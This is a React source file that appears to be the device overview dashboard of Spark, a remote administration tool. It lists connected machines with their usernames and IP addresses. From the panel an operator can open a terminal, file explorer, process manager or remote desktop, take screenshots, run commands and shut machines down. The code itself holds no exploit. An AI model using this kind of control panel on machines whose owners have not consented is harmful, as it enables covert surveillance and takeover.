import React, {useEffect, useRef, useState} from 'react';
import ProTable, {TableDropdown} from '@ant-design/pro-table';
import {Button, Image, message, Modal, Progress, Tooltip} from 'antd';
import {catchBlobReq, formatSize, request, translate, tsToTime, waitTime} from "../utils/utils";
import Generate from "../components/generate";
import Explorer from "../components/explorer";
import Terminal from "../components/terminal";
import ProcMgr from "../components/procmgr";
import Desktop from "../components/desktop";
import Runner from "../components/runner";
import {QuestionCircleOutlined} from "@ant-design/icons";
import i18n from "../locale/locale";

import defaultColumnsState from "../config/columnsState.json";

// DO NOT EDIT OR DELETE THIS COPYRIGHT MESSAGE.
console.log("%c By XZB %c https://github.com/XZB-1248/Spark", 'font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;font-size:64px;color:#00bbee;-webkit-text-fill-color:#00bbee;-webkit-text-stroke:1px#00bbee;', 'font-size:12px;');

function UsageBar(props) {
    let {usage} = props;
    usage = usage || 0;
    usage = Math.round(usage * 100) / 100;

    return (
        <Tooltip
            title={props.title??`${usage}%`}
            overlayInnerStyle={{
                whiteSpace: 'nowrap',
                wordBreak: 'keep-all',
                maxWidth: '300px',
            }}
            overlayStyle={{
                maxWidth: '300px',
            }}
        >
            <Progress percent={usage} showInfo={false} strokeWidth={12} trailColor='#FFECFF'/>
        </Tooltip>
    );
}

function overview(props) {
    const [runner, setRunner] = useState(false);
    const [desktop, setDesktop] = useState(false);
    const [procMgr, setProcMgr] = useState(false);
    const [explorer, setExplorer] = useState(false);
    const [generate, setGenerate] = useState(false);
    const [terminal, setTerminal] = useState(false);
    const [screenBlob, setScreenBlob] = useState('');
    const [isWindows, setIsWindows] = useState(false);
    const [dataSource, setDataSource] = useState([]);
    const [columnsState, setColumnsState] = useState(getInitColumnsState());

    const columns = [
        {
            key: 'hostname',
            title: i18n.t('OVERVIEW.HOSTNAME'),
            dataIndex: 'hostname',
            ellipsis: true,
            width: 100
        },
        {
            key: 'username',
            title: i18n.t('OVERVIEW.USERNAME'),
            dataIndex: 'username',
            ellipsis: true,
            width: 90
        },
        {
            key: 'ping',
            title: 'Ping',
            dataIndex: 'latency',
            ellipsis: true,
            renderText: (v) => String(v) + 'ms',
            width: 60
        },
        {
            key: 'cpu_usage',
            title: i18n.t('OVERVIEW.CPU_USAGE'),
            dataIndex: 'cpu_usage',
            ellipsis: true,
            render: (_, v) => <UsageBar title={renderCPUStat(v.cpu)} {...v.cpu} />,
            width: 100
        },
        {
            key: 'ram_usage',
            title: i18n.t('OVERVIEW.RAM_USAGE'),
            dataIndex: 'ram_usage',
            ellipsis: true,
            render: (_, v) => <UsageBar title={renderRAMStat(v.ram)} {...v.ram} />,
            width: 100
        },
        {
            key: 'disk_usage',
            title: i18n.t('OVERVIEW.DISK_USAGE'),
            dataIndex: 'disk_usage',
            ellipsis: true,
            render: (_, v) => <UsageBar title={renderDiskStat(v.disk)} {...v.disk} />,
            width: 100
        },
        {
            key: 'os',
            title: i18n.t('OVERVIEW.OS'),
            dataIndex: 'os',
            ellipsis: true,
            width: 80
        },
        {
            key: 'arch',
            title: i18n.t('OVERVIEW.ARCH'),
            dataIndex: 'arch',
            ellipsis: true,
            width: 70
        },
        {
            key: 'ram_total',
            title: i18n.t('OVERVIEW.RAM'),
            dataIndex: 'ram_total',
            ellipsis: true,
            renderText: formatSize,
            width: 70
        },
        {
            key: 'mac',
            title: 'MAC',
            dataIndex: 'mac',
            ellipsis: true,
            width: 100
        },
        {
            key: 'lan',
            title: 'LAN',
            dataIndex: 'lan',
            ellipsis: true,
            width: 100
        },
        {
            key: 'wan',
            title: 'WAN',
            dataIndex: 'wan',
            ellipsis: true,
            width: 100
        },
        {
            key: 'uptime',
            title: i18n.t('OVERVIEW.UPTIME'),
            dataIndex: 'uptime',
            ellipsis: true,
            renderText: tsToTime,
            width: 100
        },
        {
            key: 'net_stat',
            title: i18n.t('OVERVIEW.NETWORK'),
            ellipsis: true,
            renderText: (_, v) => renderNetworkIO(v),
            width: 170
        },
        {
            key: 'option',
            title: i18n.t('OVERVIEW.OPERATIONS'),
            dataIndex: 'id',
            valueType: 'option',
            ellipsis: false,
            render: (_, device) => renderOperation(device),
            width: 170
        },
    ];
    const options = {
        show: true,
        density: true,
        setting: true,
    };
    const tableRef = useRef();

    useEffect(() => {
        // Auto update is only available when all modal are closed.
        if (!runner && !desktop && !procMgr && !explorer && !generate && !terminal) {
            let id = setInterval(getData, 3000);
            return () => {
                clearInterval(id);
            };
        }
    }, [runner, desktop, procMgr, explorer, generate, terminal]);

    function getInitColumnsState() {
        let data = localStorage.getItem(`columnsState`);
        if (data !== null) {
            let stateMap = {};
            try {
                stateMap = JSON.parse(data);
            } catch (e) {
                stateMap = {};
            }
            return stateMap
        } else {
            localStorage.setItem(`columnsState`, JSON.stringify(defaultColumnsState));
        }
        return defaultColumnsState;
    }
    function saveColumnsState(stateMap) {
        setColumnsState(stateMap);
        localStorage.setItem(`columnsState`, JSON.stringify(stateMap));
    }

    function renderCPUStat(cpu) {
        let { model, usage, cores } = cpu;
        usage = Math.round(usage * 100) / 100;
        cores = {
            physical: Math.max(cores.physical, 1),
            logical: Math.max(cores.logical, 1),
        }
        return (
            <div>
                <div
                    style={{
                        fontSize: '10px',
                    }}
                >
                    {model}
                </div>
                {i18n.t('OVERVIEW.CPU_USAGE') + i18n.t('COMMON.COLON') + usage + '%'}
                <br />
                {i18n.t('OVERVIEW.CPU_LOGICAL_CORES') + i18n.t('COMMON.COLON') + cores.logical}
                <br />
                {i18n.t('OVERVIEW.CPU_PHYSICAL_CORES') + i18n.t('COMMON.COLON') + cores.physical}
            </div>
        );
    }
    function renderRAMStat(info) {
        let { usage, total, used } = info;
        usage = Math.round(usage * 100) / 100;
        return (
            <div>
                {i18n.t('OVERVIEW.RAM_USAGE') + i18n.t('COMMON.COLON') + usage + '%'}
                <br />
                {i18n.t('OVERVIEW.FREE') + i18n.t('COMMON.COLON') + formatSize(total - used)}
                <br />
                {i18n.t('OVERVIEW.USED') + i18n.t('COMMON.COLON') + formatSize(used)}
                <br />
                {i18n.t('OVERVIEW.TOTAL') + i18n.t('COMMON.COLON') + formatSize(total)}
            </div>
        );
    }
    function renderDiskStat(info) {
        let { usage, total, used } = info;
        usage = Math.round(usage * 100) / 100;
        return (
            <div>
                {i18n.t('OVERVIEW.DISK_USAGE') + i18n.t('COMMON.COLON') + usage + '%'}
                <br />
                {i18n.t('OVERVIEW.FREE') + i18n.t('COMMON.COLON') + formatSize(total - used)}
                <br />
                {i18n.t('OVERVIEW.USED') + i18n.t('COMMON.COLON') + formatSize(used)}
                <br />
                {i18n.t('OVERVIEW.TOTAL') + i18n.t('COMMON.COLON') + formatSize(total)}
            </div>
        );
    }
    function renderNetworkIO(device) {
        // Make unit starts with Kbps.
        let sent = device.net_sent * 8 / 1024;
        let recv = device.net_recv * 8 / 1024;
        return `${format(sent)} ↑ / ${format(recv)} ↓`;

        function format(size) {
            if (size <= 1) return '0 Kbps';
            // Units array is large enough.
            let k = 1024,
                i = Math.floor(Math.log(size) / Math.log(k)),
                units = ['Kbps', 'Mbps', 'Gbps', 'Tbps'];
            return (size / Math.pow(k, i)).toFixed(1) + ' ' + units[i];
        }
    }
    function renderOperation(device) {
        let menus = [
            {key: 'run', name: i18n.t('OVERVIEW.RUN')},
            {key: 'desktop', name: i18n.t('OVERVIEW.DESKTOP')},
            {key: 'screenshot', name: i18n.t('OVERVIEW.SCREENSHOT')},
            {key: 'lock', name: i18n.t('OVERVIEW.LOCK')},
            {key: 'logoff', name: i18n.t('OVERVIEW.LOGOFF')},
            {key: 'hibernate', name: i18n.t('OVERVIEW.HIBERNATE')},
            {key: 'suspend', name: i18n.t('OVERVIEW.SUSPEND')},
            {key: 'restart', name: i18n.t('OVERVIEW.RESTART')},
            {key: 'shutdown', name: i18n.t('OVERVIEW.SHUTDOWN')},
            {key: 'offline', name: i18n.t('OVERVIEW.OFFLINE')},
        ];
        return [
            <a key='terminal' onClick={setTerminal.bind(null, device)}>{i18n.t('OVERVIEW.TERMINAL')}</a>,
            <a key='procmgr' onClick={setProcMgr.bind(null, device.id)}>{i18n.t('OVERVIEW.PROC_MANAGER')}</a>,
            <a key='explorer' onClick={() => {
                setExplorer(device.id);
                setIsWindows(device.os === 'windows');
            }}>
                {i18n.t('OVERVIEW.EXPLORER')}
            </a>,
            <TableDropdown
                key='more'
                onSelect={key => callDevice(key, device)}
                menus={menus}
            />,
        ]
    }

    function callDevice(act, device) {
        if (act === 'run') {
            setRunner(device);
            return;
        }
        if (act === 'desktop') {
            setDesktop(device);
            return;
        }
        if (act === 'screenshot') {
            request('/api/device/screenshot/get', {device: device.id}, {}, {
                responseType: 'blob'
            }).then(res => {
                if ((res.data.type ?? '').substring(0, 5) === 'image') {
                    if (screenBlob.length > 0) {
                        URL.revokeObjectURL(screenBlob);
                    }
                    setScreenBlob(URL.createObjectURL(res.data));
                }
            }).catch(catchBlobReq);
            return;
        }
        Modal.confirm({
            title: i18n.t('OVERVIEW.OPERATION_CONFIRM').replace('{0}', i18n.t('OVERVIEW.'+act.toUpperCase())),
            icon: <QuestionCircleOutlined/>,
            onOk() {
                request('/api/device/' + act, {device: device.id}).then(res => {
                    let data = res.data;
                    if (data.code === 0) {
                        message.success(i18n.t('OVERVIEW.OPERATION_SUCCESS'));
                        tableRef.current.reload();
                    }
                });
            }
        });
    }

    function toolBar() {
        return (
            <Button type='primary' onClick={setGenerate.bind(null, true)}>{i18n.t('OVERVIEW.GENERATE')}</Button>
        )
    }

    async function getData(form) {
        await waitTime(300);
        let res = await request('/api/device/list');
        let data = res.data;
        if (data.code === 0) {
            let result = [];
            for (const uuid in data.data) {
                let temp = data.data[uuid];
                temp.conn = uuid;
                result.push(temp);
            }
            // Iterate all object and expand them.
            for (let i = 0; i < result.length; i++) {
                for (const k in result[i]) {
                    if (typeof result[i][k] === 'object') {
                        for (const key in result[i][k]) {
                            result[i][k + '_' + key] = result[i][k][key];
                        }
                    }
                }
            }
            result = result.sort((first, second) => {
                let firstEl = first.hostname.toUpperCase();
                let secondEl = second.hostname.toUpperCase();
                if (firstEl < secondEl) return -1;
                if (firstEl > secondEl) return 1;
                return 0;
            });
            result = result.sort((first, second) => {
                let firstEl = first.os.toUpperCase();
                let secondEl = second.os.toUpperCase();
                if (firstEl < secondEl) return -1;
                if (firstEl > secondEl) return 1;
                return 0;
            });
            setDataSource(result);
            return ({
                data: result,
                success: true,
                total: result.length
            });
        }
        return ({data: [], success: false, total: 0});
    }

    return (
        <>
            <Image
                preview={{
                    visible: screenBlob,
                    src: screenBlob,
                    onVisibleChange: () => {
                        URL.revokeObjectURL(screenBlob);
                        setScreenBlob('');
                    }
                }}
            />
            <Generate
                visible={generate}
                onVisibleChange={setGenerate}
            />
            <Explorer
                isWindows={isWindows}
                visible={explorer}
                device={explorer}
                onCancel={setExplorer.bind(null, false)}
            />
            <ProcMgr
                visible={procMgr}
                device={procMgr}
                onCancel={setProcMgr.bind(null, false)}
            />
            <Runner
                visible={runner}
                device={runner}
                onCancel={setRunner.bind(null, false)}
            />
            <Desktop
                visible={desktop}
                device={desktop}
                onCancel={setDesktop.bind(null, false)}
            />
            <Terminal
                visible={terminal}
                device={terminal}
                onCancel={setTerminal.bind(null, false)}
            />
            <ProTable
                scroll={{
                    x: 'max-content',
                    scrollToFirstRowOnChange: true
                }}
                rowKey='id'
                search={false}
                options={options}
                columns={columns}
                columnsState={{
                    value: columnsState,
                    onChange: saveColumnsState
                }}
                request={getData}
                pagination={false}
                actionRef={tableRef}
                toolBarRender={toolBar}
                dataSource={dataSource}
                onDataSourceChange={setDataSource}
            />
        </>
    );
}

function wrapper(props) {
    let Component = overview;
    return (<Component {...props} key={Math.random()}/>)
}

export default wrapper;